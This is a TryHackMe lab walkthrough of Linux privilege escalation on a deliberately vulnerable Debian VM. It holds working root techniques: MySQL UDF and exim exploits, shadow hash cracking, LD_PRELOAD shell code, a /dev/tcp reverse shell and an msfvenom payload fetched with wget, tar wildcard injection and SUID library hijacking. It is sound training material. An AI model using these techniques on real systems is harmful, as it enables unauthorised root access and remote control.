---
title: "TryHackMe - Linux PrivEsc"
categories:
  - TryHackMe
tags:
  - linux
  - writeup
  - tryhackme
  - hacking
  - privesc
---
Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

## Deploy the Vulnerable Debian VM
- Deploy the machine and login to the "user" account using SSH.

    ```bash
    ssh user@10.10.240.248

    Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
    user@debian:~$
    ```

#### Run the "id" command. What is the result?

```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Step by step:
- Change into the `/home/user/tools/mysql-udf` directory

    ```bash
    user@debian:~$ cd /home/user/tools/mysql-udf
    ```

- Compile the `raptor_udf2.c` exploit code using the following commands:

    ```bash
    user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
    user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    ```

- Connect to the MySQL service as the root user with a blank password:

    ```bash
    user@debian:~/tools/mysql-udf$ mysql -u root
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 35
    Server version: 5.1.73-1+deb6u1 (Debian)

    Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql>
    ```

- Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

    ```bash
    mysql> use mysql;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> create table foo(line blob);
    Query OK, 0 rows affected (0.01 sec)

    mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    Query OK, 1 row affected (0.00 sec)

    mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    Query OK, 1 row affected (0.00 sec)

    mysql> create function do_system returns integer soname 'raptor_udf2.so';
    Query OK, 0 rows affected (0.00 sec)
    ```

- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

    ```bash
    mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    +------------------------------------------------------------------+
    | do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
    +------------------------------------------------------------------+
    |                                                                0 |
    +------------------------------------------------------------------+
    1 row in set (0.01 sec)
    ```

- Exit out of the MySQL shell (type `exit` or `\q` and press Enter) and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

    ```bash
    mysql> exit
    Bye
    user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
    rootbash-4.1#
    ```

- Remember to remove the `/tmp/rootbash` executable and exit out of the root shell before continuing as you will create this file again later in the room!

    ```bash
    rootbash-4.1# rm /tmp/rootbash
    rootbash-4.1# exit
    exit
    ```

## Weak File Permissions - Readable /etc/shadow
The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

- Note that the /etc/shadow file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
    ```

- View the contents of the /etc/shadow file:

    ```bash
    user@debian:~$ cat /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
    daemon:*:17298:0:99999:7:::
    bin:*:17298:0:99999:7:::
    sys:*:17298:0:99999:7:::
    sync:*:17298:0:99999:7:::
    games:*:17298:0:99999:7:::
    man:*:17298:0:99999:7:::
    lp:*:17298:0:99999:7:::
    mail:*:17298:0:99999:7:::
    news:*:17298:0:99999:7:::
    uucp:*:17298:0:99999:7:::
    proxy:*:17298:0:99999:7:::
    www-data:*:17298:0:99999:7:::
    backup:*:17298:0:99999:7:::
    list:*:17298:0:99999:7:::
    irc:*:17298:0:99999:7:::
    gnats:*:17298:0:99999:7:::
    nobody:*:17298:0:99999:7:::
    libuuid:!:17298:0:99999:7:::
    Debian-exim:!:17298:0:99999:7:::
    sshd:*:17298:0:99999:7:::
    user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
    statd:*:17299:0:99999:7:::
    mysql:!:18133:0:99999:7:::
    ```

    Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

- Save the root user's hash to a file called `hash.txt`. Run the command using sudo depending on your version of Kali:

    ```bash
    $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt      
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    password123      (    root)
    password321      (    user)
    2g 0:00:00:23 DONE (2021-01-15 08:07) 0.08499g/s 2627p/s 2692c/s 2692C/s simone13..makenzi
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```

- Switch to the root user, using the cracked password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

#### What is the root user's password hash?
> It's `root:$6$Tb/euwmK$OXA.dwMeOAc opwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv RDJXET..it8r.jbrlpfZeMdwD3B0fGxJ 0:17298:0:99999:7:::`

#### What hashing algorithm was used to produce the root user's password hash?
> It's usually `sha512crypt`.

#### What is the root user's password?
> password123

## Weak File Permissions - Writable /etc/shadow
The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

- Note that the /etc/shadow file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
    ```

- Generate a new password hash with a password of your choice:

    ```bash
    user@debian:~$ mkpasswd -m sha-512 test
    $6$eoUp.j6kTQr$tG3BYYfW7dkxUDaYIMHWiFrVHc9KsMS2P8RUko7YKY31m6QDOQfWRLLOUnFuD1mHV2W5OIBCgqNyox9Mp7t9F0
    ```

- Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

    ```bash
    user@debian:~$ nano /etc/shadow
    ```

- Switch to the root user, using the new password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

## Weak File Permissions - Writable /etc/passwd
The `/etc/passwd` file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the `/etc/passwd` file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

- Note that the /etc/passwd file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/passwd
    -rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
    ```

- Generate a new password hash with a password of your choice:

    ```bash
    user@debian:~$ openssl passwd test
    CLKSOkgdxXRsg
    ```

- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

    ```bash
    user@debian:~$ nano /etc/passwd
    ```

- Switch to the root user, using the new password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

    ```bash
    user@debian:~$ cat /etc/passwd
    root:CLKSOkgdxXRsg:0:0:root:/root:/bin/bash
    newroot:CLKSOkgdxXRsg:0:0:root:/root:/bin/bash
    ```

- Now switch to the newroot user, using the new password:

    ```bash
    user@debian:~$ su newroot
    Password: 
    root@debian:/home/user# 
    ```

#### Run the "id" command as the newroot user. What is the result?

```bash
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

## Sudo - Shell Escape Sequences
List the programs which sudo allows your user to run:

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

#### How many programs is "user" allowed to run via sudo? 
> 11, as we run `sudo -l` before.

#### One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
> `/usr/sbin/apache2`

## Sudo - Environment Variables
Sudo can be configured to inherit certain environment variables from the user's environment.

- Check which environment variables are inherited (look for the env_keep options):

    ```bash
    user@debian:~$ sudo -l
    Matching Defaults entries for user on this host:
        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

    User user may run the following commands on this host:
        (root) NOPASSWD: /usr/sbin/iftop
        (root) NOPASSWD: /usr/bin/find
        (root) NOPASSWD: /usr/bin/nano
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/man
        (root) NOPASSWD: /usr/bin/awk
        (root) NOPASSWD: /usr/bin/less
        (root) NOPASSWD: /usr/bin/ftp
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/sbin/apache2
        (root) NOPASSWD: /bin/more
    ```

    LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

- Create a shared object using the code located at `/home/user/tools/sudo/preload.c`:
    
    - Source code:

        ```c
        user@debian:~$ cat /home/user/tools/sudo/preload.c
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```

    - Compile.

        ```bash
        user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
        ```

- Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

    ```bash
    user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so find
    root@debian:/home/user#
    ```

- A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

    ```bash
    root@debian:/home/user# exit
    exit
    .
    ./.mysql_history
    ./.nano_history
    ./tools
    ./tools/suid
    ./tools/suid/libcalc.c
    ./tools/suid/service.c
    ./tools/suid/exim
    ./tools/suid/exim/cve-2016-1531.sh
    ./tools/privesc-scripts
    ./tools/privesc-scripts/linpeas.sh
    ./tools/privesc-scripts/lse.sh
    ./tools/privesc-scripts/LinEnum.sh
    ./tools/nginx
    ./tools/nginx/nginxed-root.sh
    ./tools/sudo
    ./tools/sudo/library_path.c
    ./tools/sudo/preload.c
    ./tools/mysql-udf
    ./tools/mysql-udf/raptor_udf2.o
    ./tools/mysql-udf/raptor_udf2.c
    ./tools/mysql-udf/raptor_udf2.so
    ./tools/kernel-exploits
    ./tools/kernel-exploits/dirtycow
    ./tools/kernel-exploits/dirtycow/c0w.c
    ./tools/kernel-exploits/linux-exploit-suggester-2
    ./tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
    ./tools/kernel-exploits/linux-exploit-suggester-2/README.md
    ./tools/kernel-exploits/linux-exploit-suggester-2/LICENSE
    ./.john
    ./.irssi
    ./.irssi/config
    ./.bashrc
    ./.lesshst
    ./.profile
    ./.viminfo
    ./.bash_logout
    ./myvpn.ovpn
    ./.bash_history
    ```

- Run ldd against the apache2 program file to see which shared libraries are used by the program:

    ```bash
    user@debian:~$ ldd /usr/sbin/apache2
            linux-vdso.so.1 =>  (0x00007fffb9fff000)
            libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f7e4e3c9000)
            libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f7e4e1a5000)
            libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f7e4df6b000)
            libpthread.so.0 => /lib/libpthread.so.0 (0x00007f7e4dd4f000)
            libc.so.6 => /lib/libc.so.6 (0x00007f7e4d9e3000)
            libuuid.so.1 => /lib/libuuid.so.1 (0x00007f7e4d7de000)
            librt.so.1 => /lib/librt.so.1 (0x00007f7e4d5d6000)
            libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7e4d39f000)
            libdl.so.2 => /lib/libdl.so.2 (0x00007f7e4d19a000)
            libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7e4cf72000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f7e4e886000)
    ```

- Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at `/home/user/tools/sudo/library_path.c`:

    ```bash
    user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    ```

- Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

    ```bash
    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
    root@debian:/home/user# 
    ```

- A root shell should spawn. Exit out of the shell. Try renaming `/tmp/libcrypt.so.1` to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the `library_path.c` code could be changed to make it work.

    ```bash
    user@debian:~$ gcc -o /tmp/libapr-1.so.0 -shared -fPIC /home/user/tools/sudo/library_path.c
    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
    apache2: symbol lookup error: /usr/lib/libaprutil-1.so.0: undefined symbol: apr_pool_cleanup_null
    ```

## Cron Jobs - File Permissions
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

- View the contents of the system-wide crontab:

    ```bash
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```

    There should be two cron jobs scheduled to run every minute. One runs `overwrite.sh`, the other runs `/usr/local/bin/compress.sh`.

- Locate the full path of the overwrite.sh file:
    
    ```bash
    user@debian:~$ locate overwrite.sh
    locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 245.2 days)
    /usr/local/bin/overwrite.sh
    ```

- Note that the file is world-writable:

    ```bash
    user@debian:~$ ls -l /usr/local/bin/overwrite.sh
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
    ```

- Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

    ```
    #!/bin/bash
    bash -i >& /dev/tcp/10.11.25.205/9999 0>&1
    ```

- Set up a netcat listener on your Kali box on port 9999 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.240.248] 48535
    bash: no job control in this shell
    root@debian:~#
    ```

## Cron Jobs - PATH Environment Variable
View the contents of the system-wide crontab:

- View the contents of the system-wide crontab:

    ```bash
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```
    
    Note that the PATH variable starts with /home/user which is our user's home directory.

- Create a file called overwrite.sh in your home directory with the following contents:

    ```bash
    #!/bin/bash

    cp /bin/bash /tmp/rootbash
    chmod +xs /tmp/rootbash
    ```

- Make sure that the file is executable:

    ```bash
    user@debian:~$ chmod +x /home/user/overwrite.sh
    ```

- Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

    ```bash
    user@debian:~$ /tmp/rootbash -p
    rootbash-4.1# 
    ```

#### What is the value of the PATH variable in /etc/crontab?
> `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

## Cron Jobs - Wildcards
- View the contents of the other cron job script:

    ```bash
    user@debian:~$ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *
    ```

    Note that the tar command is being run with a wildcard (*) in your home directory. Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

    ```bash
    $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.25.205 LPORT=9999 -f elf -o shell.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 74 bytes
    Final size of elf file: 194 bytes
    Saved as: shell.elf
    ```

- Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

    ```bash
    user@debian:~$ wget http://10.11.25.205:8080/shell.elf
    --2021-01-15 09:33:37--  http://10.11.25.205:8080/shell.elf
    Connecting to 10.11.25.205:8080... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 194 [application/octet-stream]
    Saving to: “shell.elf”

    100%[====================================================================>] 194         --.-K/s   in 0s      

    2021-01-15 09:33:37 (42.8 MB/s) - “shell.elf” saved [194/194]

    user@debian:~$ chmod +x /home/user/shell.elf
    ```

- Create these two files in /home/user:

    ```bash
    user@debian:~$ touch /home/user/--checkpoint=1
    user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
    ```

    When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

- Set up a netcat listener on your Kali box on port 9999 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.240.248] 48588
    whoami
    root
    ```

## SUID / SGID Executables - Known Exploits
- Find all the SUID/SGID executables on the Debian VM:

    ```bash
    user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
    ```

    Note that `/usr/sbin/exim-4.84-3` appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

    A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at `/home/user/tools/suid/exim/cve-2016-1531.sh`.

- Run the exploit script to gain a root shell:

    ```bash
    user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
    [ CVE-2016-1531 local root exploit
    sh-4.1# 
    ```

## SUID / SGID Executables - Shared Object Injection
The `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection.

- First, execute the file and note that currently it displays a progress bar before exiting:

    ```bash
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    [=====================================================================>] 99 %
    Done.
    ```

- Run `strace` on the file and search the output for open/access calls and for "no such file" errors:

    ```bash
    user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
    ```

    Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within our home directory, but it cannot be found.

- Create the .config directory for the libcalc.so file:

    ```bash
    user@debian:~$ mkdir /home/user/.config
    ```

- Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

    - libcalc.c:

        ```c
        user@debian:~$ cat /home/user/tools/suid/libcalc.c
        #include <stdio.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
                setuid(0);
                system("/bin/bash -p");
        }
        ```

    - Compiling.

        ```bash
        user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
        ```

- Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

    ```bash
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    bash-4.1# 
    ```

## SUID / SGID Executables - Environment Variables
TO-DO
